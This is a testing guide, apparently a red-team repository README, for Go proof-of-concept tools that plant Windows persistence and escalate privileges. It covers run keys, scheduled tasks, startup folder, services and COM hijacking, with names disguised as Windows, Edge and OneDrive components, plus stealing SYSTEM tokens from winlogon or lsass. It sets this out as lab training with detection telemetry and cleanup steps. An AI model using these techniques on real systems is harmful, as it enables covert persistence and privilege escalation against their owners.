# Testing Guide — Persistence & Privilege Escalation PoCs

> **Use only in an isolated lab VM you own or have written authorization to test against.**
> All examples here are written for red-team training and detection-engineering work.
> Snapshot the VM before each test and roll back when finished.

## Lab Setup

| Item | Recommended |
|---|---|
| OS | Windows 10 / 11 (any edition) in a VM |
| Snapshot | Created before testing, restored after |
| Sysmon | Installed with [SwiftOnSecurity config](https://github.com/SwiftOnSecurity/sysmon-config) for telemetry |
| Defender | Real-time protection off, or test directory excluded |
| Go | 1.21+ (`go version`) |
| Account | Admin account for service / token PoCs; standard user is enough for the rest |
| Tools | [Sysinternals autoruns](https://learn.microsoft.com/sysinternals/downloads/autoruns), Process Explorer |

## Build

Each `.go` file is a standalone program. Build individually:

```cmd
go build -o persistence_registry.exe   persistence_registry.go
go build -o persistence_schtask.exe    persistence_schtask.go
go build -o persistence_startup.exe    persistence_startup.go
go build -o persistence_service.exe    persistence_service.go
go build -o persistence_com.exe        persistence_com.go
go build -o token_impersonation.exe    token_impersonation.go
```

Strip debug info / symbols for smaller binaries:

```cmd
go build -ldflags "-s -w" -o registry.exe persistence_registry.go
```

For cross-compilation from Linux:

```sh
GOOS=windows GOARCH=amd64 go build -o registry.exe persistence_registry.go
```

---

## 1. Registry Run Key — `persistence_registry.go`

MITRE T1547.001. HKCU writes need no admin; HKLM does.

```cmd
:: Plant
persistence_registry.exe C:\Tools\payload.exe

:: Verify
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateHelper

:: Trigger
logoff
:: log back in -> payload runs

:: Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateHelper /f
```

---

## 2. Scheduled Task — `persistence_schtask.go`

MITRE T1053.005. Creates two tasks (wrapper + XML variants) with onlogon trigger.

```cmd
:: Plant
persistence_schtask.exe C:\Tools\payload.exe

:: Verify
schtasks /Query /TN MicrosoftEdgeUpdateCore /V /FO LIST
schtasks /Query /TN MicrosoftEdgeUpdateCore_XML /V /FO LIST

:: Manual trigger (instead of logoff)
schtasks /Run /TN MicrosoftEdgeUpdateCore

:: Cleanup
schtasks /Delete /TN MicrosoftEdgeUpdateCore /F
schtasks /Delete /TN MicrosoftEdgeUpdateCore_XML /F
```

---

## 3. Startup Folder — `persistence_startup.go`

MITRE T1547.001. Drops a binary copy AND an LNK shortcut.

```cmd
:: Plant
persistence_startup.exe C:\Tools\payload.exe

:: Verify
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Trigger
logoff

:: Cleanup
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveHelper.exe"
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveHelper.lnk"
```

---

## 4. Windows Service — `persistence_service.go`

MITRE T1543.003. **Requires elevated cmd.**

A non-service binary will time out (Error 1053) but still execute.
Wrap via `cmd.exe /c` for quick testing — exe and args are passed
separately so each is escaped correctly:

```cmd
:: Plant (admin cmd) - exe + args as separate tokens
persistence_service.exe install cmd.exe /c calc.exe

:: Verify
sc query WinHelperSvc
reg query "HKLM\SYSTEM\CurrentControlSet\Services\WinHelperSvc" /v ImagePath

:: Manual start (otherwise waits for next boot)
persistence_service.exe start

:: Cleanup
persistence_service.exe remove
```

For a service binary that survives the SCM handshake, build a payload that
calls `golang.org/x/sys/windows/svc.Run` and pass that exe path directly:

```cmd
persistence_service.exe install C:\Tools\real_service.exe
```

---

## 5. COM Hijacking — `persistence_com.go`

MITRE T1546.015. No admin needed.

You'll need a hijacking DLL that exports `DllGetClassObject`. For an
end-to-end load test, any DLL with that export works — Explorer will load
it on activation even if it doesn't implement the target interface (it may
crash, hence VM + snapshot).

```cmd
:: Plant
persistence_com.exe "{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}" C:\Tools\hijack.dll

:: Verify
reg query "HKCU\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}\InprocServer32"

:: Trigger options:
::   - Open Task Scheduler MMC (taskschd.msc) - resolves the example CLSID
::   - Use Process Monitor to watch for the hijack DLL load

:: Cleanup
reg delete "HKCU\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}" /f
```

Other CLSIDs to experiment with (all loaded by user-mode shell processes):

| CLSID | Description |
|---|---|
| `{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}` | ScheduledTasks |
| `{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}` | Shell Folder |
| `{42aedc87-2188-41fd-b9a3-0c966feabec1}` | IShellFolderViewCB |

---

## 6. Token Impersonation — `token_impersonation.go`

MITRE T1134.001. **Requires elevated cmd (local Administrator).**

```cmd
:: Steal SYSTEM token from winlogon, spawn cmd as SYSTEM
token_impersonation.exe winlogon.exe C:\Windows\System32\cmd.exe

:: In the new cmd window, verify
whoami
:: expected output: nt authority\system
```

Other useful targets:

```cmd
token_impersonation.exe lsass.exe                    :: SYSTEM (with extra protections on modern Win)
token_impersonation.exe explorer.exe                 :: pivot to interactive user
token_impersonation.exe services.exe powershell.exe  :: SYSTEM PowerShell
```

No persistent cleanup needed; close the spawned cmd to release the token.

---

## Detection Reference

| PoC | MITRE | Primary Telemetry |
|---|---|---|
| Registry Run | T1547.001 | Sysmon EID 13 on `Run` key |
| Scheduled Task | T1053.005 | Security EID 4698, Sysmon EID 11 in `\System32\Tasks` |
| Startup Folder | T1547.001 | Sysmon EID 11 in `Startup\` directory |
| Windows Service | T1543.003 | Security EID 7045, 4697 |
| COM Hijacking | T1546.015 | Sysmon EID 12/13/14 on `HKCU\Software\Classes\CLSID` |
| Token Impersonation | T1134.001 | Sysmon EID 10 (ProcessAccess), Security EID 4624 logon type 9 |

For a one-shot autoruns audit covering registry, scheduled task, startup
folder, service, and COM persistence:

```cmd
autoruns.exe -a * -h
```

## Known Limitations

- All PoCs are 64-bit only and target Windows 10 / 11.
- None implement opsec hardening (string obfuscation, indirect syscalls,
  unhooking, sleep-mask). They are intended as study artifacts.
- The shellcode payloads from the rest of this repo (`basic.go`, `remote.go`,
  etc.) trigger Defender by default in non-lab settings.
